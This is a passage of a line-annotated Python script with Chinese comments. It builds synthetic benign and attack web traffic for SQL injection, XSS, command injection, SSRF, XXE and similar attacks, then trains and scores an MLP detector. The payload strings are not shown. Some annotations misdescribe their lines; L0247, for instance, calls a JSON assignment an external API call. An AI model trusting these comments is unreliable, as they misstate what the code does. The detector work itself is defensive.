| L0233 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        body = f'Content-Disposition: form-data; name="file"; filename="{filename}"'</code> |
| L0234 | 计算并保存 &#96;content_type&#96;（contenttype），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        content_type = "multipart/form-data"</code> |
| L0235 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        status_code = 201</code> |
| L0236 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        response_body = json_body(ok=True, filename=filename)</code> |
| L0237 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_benign_sample。 | <code>    elif uri == "/api/graphql":</code> |
| L0238 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        body = json_body(query="{ viewer { id username displayName } }")</code> |
| L0239 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        status_code = 200</code> |
| L0240 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        response_body = json_body(data={"viewer": {"id": rng.randint(1, 99)}})</code> |
| L0241 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_benign_sample。 | <code>    elif uri == "/api/xml/import":</code> |
| L0242 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        body = "&lt;note&gt;&lt;title&gt;hello&lt;/title&gt;&lt;body&gt;normal&lt;/body&gt;&lt;/note&gt;"</code> |
| L0243 | 计算并保存 &#96;content_type&#96;（contenttype），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        content_type = "application/xml"</code> |
| L0244 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        status_code = 200</code> |
| L0245 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        response_body = json_body(ok=True)</code> |
| L0246 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_benign_sample。 | <code>    elif uri == "/api/fetch":</code> |
| L0247 | 调用外部 HTTP/大模型 API，并等待远端返回结果，当前位于函数 make_benign_sample。 | <code>        body = json_body(url=rng.choice(["https://example.com/logo.png", "https://docs.python.org/", "https://openai.com/"]))</code> |
| L0248 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        status_code = 200</code> |
| L0249 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        response_body = json_body(ok=True)</code> |
| L0250 | 处理前述条件均未命中的情况，当前位于函数 make_benign_sample。 | <code>    else:</code> |
| L0251 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        body = json_body(value=word)</code> |
| L0252 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        status_code = 200</code> |
| L0253 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        response_body = json_body(ok=True)</code> |
| L0254 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0255 | 计算并保存 &#96;req&#96;（req），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>    req = make_request(method, uri, body, sample_id * 2, sample_id * 2 + 1, content_type)</code> |
| L0256 | 计算并保存 &#96;resp&#96;（resp），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>    resp = make_response(status_code, response_body, sample_id * 2 + 1, sample_id * 2, req["time"] + rng.uniform(0.01, 0.4))</code> |
| L0257 | 结束当前函数并把结果返回给调用方，当前位于函数 make_benign_sample。 | <code>    return req, resp, "benign", 0</code> |
| L0258 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0259 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0260 | 定义make攻击sample函数 &#96;make_attack_sample&#96;，封装可复用业务逻辑。 | <code>def make_attack_sample(sample_id: int, rng: random.Random, attack_type: str):</code> |
| L0261 | 计算并保存 &#96;payload&#96;（payload），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>    payload = rng.choice(ATTACK_PAYLOADS[attack_type])</code> |
| L0262 | 计算并保存 &#96;method&#96;（method），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>    method = "POST"</code> |
| L0263 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>    uri = "/api/auth/login"</code> |
| L0264 | 计算并保存 &#96;content_type&#96;（contenttype），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>    content_type = "application/json"</code> |
| L0265 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>    status_code = rng.choice([400, 403, 500, 504])</code> |
| L0266 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0267 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 make_attack_sample。 | <code>    if attack_type == "sql_injection":</code> |
| L0268 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = json_body(username="admin", password=payload)</code> |
| L0269 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="database error")</code> |
| L0270 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "xss":</code> |
| L0271 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = json_body(username="admin", password=payload)</code> |
| L0272 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="server error")</code> |
| L0273 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "command_injection":</code> |
| L0274 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        uri = "/api/system/ping"</code> |
| L0275 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = json_body(host=payload)</code> |
| L0276 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="command rejected")</code> |
| L0277 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "path_traversal":</code> |
| L0278 | 计算并保存 &#96;method&#96;（method），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        method = "GET"</code> |
| L0279 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        uri = f"/api/file/read?path={payload}"</code> |
| L0280 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = ""</code> |
| L0281 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="file access denied")</code> |
| L0282 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "ssrf":</code> |
| L0283 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        uri = "/api/fetch"</code> |
| L0284 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = json_body(url=payload)</code> |
| L0285 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="internal target blocked")</code> |
| L0286 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "malicious_upload":</code> |
| L0287 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        uri = "/api/upload"</code> |
| L0288 | 计算并保存 &#96;content_type&#96;（contenttype），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        content_type = "multipart/form-data"</code> |
| L0289 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = f'Content-Disposition: form-data; name="file"; filename="{payload}"'</code> |
| L0290 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="dangerous file extension")</code> |
| L0291 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "xxe":</code> |
| L0292 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        uri = "/api/xml/import"</code> |
| L0293 | 计算并保存 &#96;content_type&#96;（contenttype），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        content_type = "application/xml"</code> |
| L0294 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = payload</code> |
| L0295 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="external entity blocked")</code> |
| L0296 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "ssti":</code> |
| L0297 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        uri = "/api/template/render"</code> |
| L0298 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = json_body(template=payload)</code> |
| L0299 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="template sandbox violation")</code> |
| L0300 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "deserialization":</code> |
| L0301 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        uri = "/api/deserialize"</code> |
| L0302 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = json_body(blob=payload)</code> |
| L0303 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="unsafe serialized object")</code> |
| L0304 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "graphql_abuse":</code> |
| L0305 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        uri = "/api/graphql"</code> |
| L0306 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = json_body(query=payload)</code> |
| L0307 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="graphql policy violation")</code> |
| L0308 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_attack_sample。 | <code>    elif attack_type == "bruteforce":</code> |
| L0309 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_attack_sample。 | <code>        username, password = payload.split(":", 1)</code> |
| L0310 | 计算并保存 &#96;attempts&#96;（attempts），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        attempts = rng.randint(8, 40)</code> |
| L0311 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = json_body(username=username, password=password, attempts=attempts)</code> |
| L0312 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="ErrAuth: too many failed login attempts", attempts=attempts)</code> |
| L0313 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        status_code = rng.choice([403, 429, 429])</code> |
| L0314 | 处理前述条件均未命中的情况，当前位于函数 make_attack_sample。 | <code>    else:</code> |
| L0315 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        body = json_body(payload=payload)</code> |
| L0316 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>        response_body = json_body(error="blocked")</code> |
| L0317 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0318 | 计算并保存 &#96;req&#96;（req），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>    req = make_request(method, uri, body, sample_id * 2, sample_id * 2 + 1, content_type)</code> |
| L0319 | 计算并保存 &#96;resp&#96;（resp），供后续逻辑使用，当前位于函数 make_attack_sample。 | <code>    resp = make_response(status_code, response_body, sample_id * 2 + 1, sample_id * 2, req["time"] + rng.uniform(0.01, 0.8))</code> |
| L0320 | 结束当前函数并把结果返回给调用方，当前位于函数 make_attack_sample。 | <code>    return req, resp, attack_type, 1</code> |
| L0321 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0322 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0323 | 定义generatedataset函数 &#96;generate_dataset&#96;，封装可复用业务逻辑。 | <code>def generate_dataset(args, numeric_cols, categorical_cols, categorical_choices):</code> |
| L0324 | 计算并保存 &#96;rng&#96;（rng），供后续逻辑使用，当前位于函数 generate_dataset。 | <code>    rng = random.Random(args.seed)</code> |
| L0325 | 计算并保存 &#96;feature_rows&#96;（feature数据库记录），供后续逻辑使用，当前位于函数 generate_dataset。 | <code>    feature_rows = []</code> |
| L0326 | 计算并保存 &#96;labels&#96;（labels），供后续逻辑使用，当前位于函数 generate_dataset。 | <code>    labels = []</code> |
| L0327 | 计算并保存 &#96;attack_types&#96;（攻击types），供后续逻辑使用，当前位于函数 generate_dataset。 | <code>    attack_types = []</code> |
| L0328 | 计算并保存 &#96;raw_rows&#96;（raw数据库记录），供后续逻辑使用，当前位于函数 generate_dataset。 | <code>    raw_rows = []</code> |
| L0329 | 计算并保存 &#96;sample_id&#96;（sampleid），供后续逻辑使用，当前位于函数 generate_dataset。 | <code>    sample_id = 1</code> |
| L0330 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0331 | 遍历集合中的数据项并逐项处理，当前位于函数 generate_dataset。 | <code>    for _ in range(args.benign_samples):</code> |
| L0332 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 generate_dataset。 | <code>        req, resp, attack_type, label = make_benign_sample(sample_id, rng)</code> |
| L0333 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_dataset。 | <code>        feature_rows.append(build_feature_row(sample_id, req, resp, numeric_cols, categorical_cols, categorical_choices))</code> |
| L0334 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_dataset。 | <code>        labels.append(label)</code> |
| L0335 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_dataset。 | <code>        attack_types.append(attack_type)</code> |
| L0336 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_dataset。 | <code>        raw_rows.append({"sample_id": sample_id, "attack_type": attack_type, "label": label, "request_text": req["_request_text"], "response_text": resp["_response_text"]})</code> |
| L0337 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 generate_dataset。 | <code>        sample_id += 1</code> |
| L0338 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0339 | 遍历集合中的数据项并逐项处理，当前位于函数 generate_dataset。 | <code>    for attack_type in ATTACK_PAYLOADS:</code> |
| L0340 | 遍历集合中的数据项并逐项处理，当前位于函数 generate_dataset。 | <code>        for _ in range(args.samples_per_attack_type):</code> |
| L0341 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 generate_dataset。 | <code>            req, resp, kind, label = make_attack_sample(sample_id, rng, attack_type)</code> |
| L0342 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_dataset。 | <code>            feature_rows.append(build_feature_row(sample_id, req, resp, numeric_cols, categorical_cols, categorical_choices))</code> |
| L0343 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_dataset。 | <code>            labels.append(label)</code> |
| L0344 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_dataset。 | <code>            attack_types.append(kind)</code> |
| L0345 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 generate_dataset。 | <code>            raw_rows.append({"sample_id": sample_id, "attack_type": kind, "label": label, "request_text": req["_request_text"], "response_text": resp["_response_text"]})</code> |
| L0346 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 generate_dataset。 | <code>            sample_id += 1</code> |
| L0347 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0348 | 结束当前函数并把结果返回给调用方，当前位于函数 generate_dataset。 | <code>    return pd.DataFrame(feature_rows), np.array(labels, dtype=np.float32), np.array(attack_types), raw_rows</code> |
| L0349 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0350 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0351 | 定义评估scores函数 &#96;evaluate_scores&#96;，封装可复用业务逻辑。 | <code>def evaluate_scores(y_true, scores, threshold):</code> |
| L0352 | 计算并保存 &#96;pred&#96;（pred），供后续逻辑使用，当前位于函数 evaluate_scores。 | <code>    pred = (scores &gt;= threshold).astype(int)</code> |
| L0353 | 计算并保存 &#96;metrics&#96;（metrics），供后续逻辑使用，当前位于函数 evaluate_scores。 | <code>    metrics = {</code> |
| L0354 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 evaluate_scores。 | <code>        "threshold": threshold,</code> |
| L0355 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 evaluate_scores。 | <code>        "accuracy": float(accuracy_score(y_true, pred)),</code> |
| L0356 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 evaluate_scores。 | <code>        "precision": float(precision_score(y_true, pred, zero_division=0)),</code> |
| L0357 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 evaluate_scores。 | <code>        "recall": float(recall_score(y_true, pred, zero_division=0)),</code> |
| L0358 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 evaluate_scores。 | <code>        "f1": float(f1_score(y_true, pred, zero_division=0)),</code> |
| L0359 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 evaluate_scores。 | <code>        "confusion_matrix": confusion_matrix(y_true, pred).tolist(),</code> |
| L0360 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 evaluate_scores。 | <code>    }</code> |
| L0361 | 开始受保护操作，异常会交给后续分支处理，当前位于函数 evaluate_scores。 | <code>    try:</code> |
| L0362 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 evaluate_scores。 | <code>        metrics["roc_auc"] = float(roc_auc_score(y_true, scores))</code> |
| L0363 | 捕获异常，避免单次错误导致整个服务退出，当前位于函数 evaluate_scores。 | <code>    except Exception:</code> |
| L0364 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 evaluate_scores。 | <code>        metrics["roc_auc"] = None</code> |
| L0365 | 结束当前函数并把结果返回给调用方，当前位于函数 evaluate_scores。 | <code>    return metrics, pred</code> |
| L0366 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0367 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0368 | 定义pertypemetrics函数 &#96;per_type_metrics&#96;，封装可复用业务逻辑。 | <code>def per_type_metrics(types, y_true, scores, pred):</code> |
| L0369 | 计算并保存 &#96;rows&#96;（数据库记录），供后续逻辑使用，当前位于函数 per_type_metrics。 | <code>    rows = []</code> |
| L0370 | 遍历集合中的数据项并逐项处理，当前位于函数 per_type_metrics。 | <code>    for kind in sorted(set(types)):</code> |
| L0371 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>        mask = types == kind</code> |
| L0372 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 per_type_metrics。 | <code>        if not np.any(mask):</code> |
| L0373 | 控制当前循环或占位分支的执行流程，当前位于函数 per_type_metrics。 | <code>            continue</code> |
| L0374 | 计算并保存 &#96;expected&#96;（expected），供后续逻辑使用，当前位于函数 per_type_metrics。 | <code>        expected = int(round(float(np.mean(y_true[mask]))))</code> |
| L0375 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 per_type_metrics。 | <code>        if expected == 0:</code> |
| L0376 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>            success = float(np.mean(pred[mask] == 0))</code> |
| L0377 | 处理前述条件均未命中的情况，当前位于函数 per_type_metrics。 | <code>        else:</code> |
| L0378 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>            success = float(np.mean(pred[mask] == 1))</code> |
| L0379 | 把当前结果加入集合，供后续聚合、排序或返回，当前位于函数 per_type_metrics。 | <code>        rows.append(</code> |
| L0380 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>            {</code> |
| L0381 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>                "type": kind,</code> |
| L0382 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>                "count": int(np.sum(mask)),</code> |
| L0383 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>                "expected_label": expected,</code> |
| L0384 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>                "success_rate": round(success, 6),</code> |
| L0385 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>                "avg_score": round(float(np.mean(scores[mask])), 6),</code> |
| L0386 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>                "min_score": round(float(np.min(scores[mask])), 6),</code> |
| L0387 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 per_type_metrics。 | <code>                "max_score": round(float(np.max(scores[mask])), 6),</code> |
| L0388 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 per_type_metrics。 | <code>            }</code> |
| L0389 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 per_type_metrics。 | <code>        )</code> |
| L0390 | 结束当前函数并把结果返回给调用方，当前位于函数 per_type_metrics。 | <code>    return rows</code> |
| L0391 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0392 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0393 | 定义写入csv函数 &#96;write_csv&#96;，封装可复用业务逻辑。 | <code>def write_csv(path: Path, rows):</code> |
| L0394 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 write_csv。 | <code>    if not rows:</code> |
| L0395 | 结束当前函数并把结果返回给调用方，当前位于函数 write_csv。 | <code>        return</code> |
| L0396 | 通过上下文管理器安全打开资源，并在结束后自动释放，当前位于函数 write_csv。 | <code>    with path.open("w", encoding="utf-8-sig", newline="") as f:</code> |
| L0397 | 计算并保存 &#96;writer&#96;（writer），供后续逻辑使用，当前位于函数 write_csv。 | <code>        writer = csv.DictWriter(f, fieldnames=list(rows[0].keys()))</code> |
| L0398 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 write_csv。 | <code>        writer.writeheader()</code> |
| L0399 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 write_csv。 | <code>        writer.writerows(rows)</code> |
| L0400 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0401 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0402 | 定义main函数 &#96;main&#96;，封装可复用业务逻辑。 | <code>def main():</code> |
| L0403 | 计算并保存 &#96;parser&#96;（parser），供后续逻辑使用，当前位于函数 main。 | <code>    parser = argparse.ArgumentParser(description="Train old-compatible MLP on synthetic classic web vulnerability data.")</code> |
| L0404 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--preprocessor", default=str(PROJECT_ROOT / "models" / "preprocessor.joblib"))</code> |
| L0405 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--base-model", default=str(PROJECT_ROOT / "models" / "best_mlp.pth"))</code> |
| L0406 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--output-dir", default=str(PROJECT_ROOT / "output" / "synthetic_web_mlp_training"))</code> |
| L0407 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--model-output", default="")</code> |
| L0408 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--seed", type=int, default=20260604)</code> |
| L0409 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--benign-samples", type=int, default=6000)</code> |
| L0410 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--samples-per-attack-type", type=int, default=650)</code> |
| L0411 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--epochs", type=int, default=35)</code> |
| L0412 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--batch-size", type=int, default=256)</code> |
| L0413 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--learning-rate", type=float, default=1e-3)</code> |
| L0414 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--threshold", type=float, default=0.46)</code> |
| L0415 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--install", action="store_true", help="Backup and replace models/best_mlp.pth when metrics are acceptable.")</code> |
| L0416 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--min-accuracy", type=float, default=0.98)</code> |
| L0417 | 声明一个命令行启动参数，允许部署时覆盖默认配置。 | <code>    parser.add_argument("--min-recall", type=float, default=0.98)</code> |
| L0418 | 计算并保存 &#96;args&#96;（args），供后续逻辑使用，当前位于函数 main。 | <code>    args = parser.parse_args()</code> |
| L0419 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0420 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    set_seed(args.seed)</code> |
| L0421 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0422 | 计算并保存 &#96;preprocessor_path&#96;（preprocessorpath），供后续逻辑使用，当前位于函数 main。 | <code>    preprocessor_path = Path(args.preprocessor).resolve()</code> |
| L0423 | 计算并保存 &#96;base_model_path&#96;（base模型path），供后续逻辑使用，当前位于函数 main。 | <code>    base_model_path = Path(args.base_model).resolve()</code> |
| L0424 | 计算并保存 &#96;run_dir&#96;（运行dir），供后续逻辑使用，当前位于函数 main。 | <code>    run_dir = Path(args.output_dir).resolve() / datetime.now().strftime("%Y%m%d_%H%M%S")</code> |
| L0425 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    run_dir.mkdir(parents=True, exist_ok=True)</code> |
| L0426 | 计算并保存 &#96;model_output&#96;（模型output），供后续逻辑使用，当前位于函数 main。 | <code>    model_output = Path(args.model_output).resolve() if args.model_output else run_dir / "best_mlp_web_synthetic.pth"</code> |
| L0427 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0428 | 计算并保存 &#96;preprocessor&#96;（preprocessor），供后续逻辑使用，当前位于函数 main。 | <code>    preprocessor = joblib.load(preprocessor_path)</code> |
| L0429 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    numeric_cols, categorical_cols, categorical_choices = load_preprocessor_schema(preprocessor)</code> |
| L0430 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0431 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    feature_df, labels, attack_types, raw_rows = generate_dataset(args, numeric_cols, categorical_cols, categorical_choices)</code> |
| L0432 | 计算并保存 &#96;required_cols&#96;（requiredcols），供后续逻辑使用，当前位于函数 main。 | <code>    required_cols = categorical_cols + numeric_cols</code> |
| L0433 | 计算并保存 &#96;X&#96;（X），供后续逻辑使用，当前位于函数 main。 | <code>    X = preprocessor.transform(feature_df[required_cols])</code> |
| L0434 | 计算并保存 &#96;X&#96;（X），供后续逻辑使用，当前位于函数 main。 | <code>    X = X.toarray() if hasattr(X, "toarray") else X</code> |
| L0435 | 计算并保存 &#96;X&#96;（X），供后续逻辑使用，当前位于函数 main。 | <code>    X = X.astype(np.float32)</code> |
| L0436 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0437 | 计算并保存 &#96;idx&#96;（idx），供后续逻辑使用，当前位于函数 main。 | <code>    idx = np.arange(len(labels))</code> |
| L0438 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    train_idx, temp_idx = train_test_split(idx, test_size=0.3, random_state=args.seed, stratify=labels)</code> |
